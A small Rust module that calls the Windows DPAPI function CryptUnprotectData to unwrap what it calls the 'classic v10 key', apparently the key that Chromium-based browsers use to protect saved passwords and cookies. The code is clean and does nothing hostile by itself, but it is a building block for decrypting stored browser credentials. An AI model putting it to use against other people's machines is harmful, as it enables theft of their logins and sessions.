//! DPAPI user-scope unwrap (CryptUnprotectData) for the classic v10 key.

use crate::ffi::*;
use core::ptr::null_mut;

pub fn unprotect(blob: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let input = DATA_BLOB {
            cbData: blob.len() as u32,
            pbData: blob.as_ptr() as *mut u8,
        };
        let mut output = DATA_BLOB {
            cbData: 0,
            pbData: null_mut(),
        };
        let ok = CryptUnprotectData(
            &input,
            null_mut(),
            core::ptr::null(),
            null_mut(),
            null_mut(),
            0,
            &mut output,
        );
        if ok == 0 {
            return Err(format!("CryptUnprotectData failed: gle=0x{:08x}", GetLastError()));
        }
        if output.pbData.is_null() || output.cbData == 0 {
            return Err("CryptUnprotectData returned empty output".to_string());
        }
        let bytes =
            core::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
        LocalFree(output.pbData as LPVOID);
        Ok(bytes)
    }
}
